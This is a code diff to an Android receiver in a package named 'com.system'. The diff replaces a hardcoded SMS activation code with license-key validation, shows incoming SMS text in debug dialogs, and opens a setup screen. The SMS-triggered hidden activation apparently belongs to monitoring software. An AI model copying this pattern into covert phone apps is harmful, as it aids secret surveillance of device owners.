@@ -2,7 +2,10 @@ package com.system;
 
 import com.system.activity.InitActivity;
 import com.system.feature.sms.SmsCtrl;
+import com.system.utils.ConfigCtrl;
 import com.system.utils.SysUtils;
+import com.system.utils.license.LicenseCtrl;
+import com.system.utils.license.LicenseType;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -18,12 +21,11 @@ public class ActivationReceiver extends BroadcastReceiver
 {
 	private static final String LOGTAG = "ActivationReceiver";
 	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
-	private static final String ACTIVATION_CODE = "1234567890";
 	
 	@Override
 	public void onReceive(Context context, Intent intent) 
 	{
-		//SysUtils.messageBox(context, "Enter ActivationReceiver : " + intent.getAction());
+		SysUtils.messageBox(context, "Enter ActivationReceiver : " + intent.getAction());
 		
 		if (intent.getAction().equals(SMS_RECEIVED)) 
 		{	
@@ -36,12 +38,22 @@ public class ActivationReceiver extends BroadcastReceiver
 
 			if (smsMessages.length > 0) {
 				// Show the lastest coming SMS
-				String smsBody = smsMessages[0].getMessageBody();
-				//SysUtils.messageBox(context, "Received SMS: " + smsBody);
+				String smsBody = smsMessages[0].getMessageBody().trim();
+				SysUtils.messageBox(context, "Received SMS: " + smsBody);
 				
 				// Show the setting view
-				if (smsBody.equals(ACTIVATION_CODE)) {
+				if (smsBody.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH &&  
+					LicenseCtrl.isLicensed(context, smsBody) != LicenseType.NotLicensed) 
+				{
+					SysUtils.messageBox(context, "Got license: " + LicenseCtrl.enumToStr(LicenseCtrl.isLicensed(context, smsBody)));
 					try {
+						//Save flag
+						LicenseType type = LicenseCtrl.isLicensed(context, smsBody);
+						if (!ConfigCtrl.setLicenseType(context, type)) {
+							Log.e(LOGTAG, "Cannot set license type");
+						}
+						
+						//Start dialog
 						Intent initIntent = new Intent().setClass(context, InitActivity.class);
 						initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
 						initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
@@ -59,4 +71,5 @@ public class ActivationReceiver extends BroadcastReceiver
 		}
         
 	}
+
 }
